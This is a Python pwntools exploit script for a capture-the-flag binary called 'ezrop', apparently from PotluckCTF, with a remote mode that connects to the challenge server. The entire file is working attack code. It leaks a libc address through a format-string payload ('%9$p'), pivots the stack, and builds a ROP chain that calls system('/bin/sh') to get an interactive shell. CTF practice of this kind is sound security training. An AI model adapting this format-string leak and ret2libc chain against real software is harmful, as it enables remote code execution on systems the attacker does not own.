#!/usr/bin/python3

from pwn import *

exe = ELF('ezrop_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe

def GDB():
        if not args.REMOTE:
                gdb.attach(p, gdbscript='''

                b* 0x40120c
                c
                ''')
                input()
rop = ROP(exe)
# rop.write(7, 8, 9)
# find_gadget(['pop rdi, ret'])
info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

if args.REMOTE:
        p = remote('challenge19.play.potluckctf.com', 31337)
else:
        p = process(exe.path)

GDB()
payload = b'%9$p|'
payload = payload.ljust(0x20, b'a') + p64(0x404a00) # 0x4049e0 0x404a08
payload += p64(0x4011EE) + p64(exe.sym.vuln)
sla(b' name: ', payload)
libc.address = int(p.recvuntil(b'|', drop = True), 16) - 0x29d90
info ("libc: "  + hex(libc.address))
rop = ROP(libc)
payload = b''.ljust(0x20, b'a')
payload += flat(0x404a00,
                rop.find_gadget(['ret'])[0],
                rop.find_gadget(['pop rdi', 'ret'])[0],
                next(libc.search(b'/bin/sh\0')),
                libc.sym.system
                )
sleep(1)
sl(payload)
p.interactive()
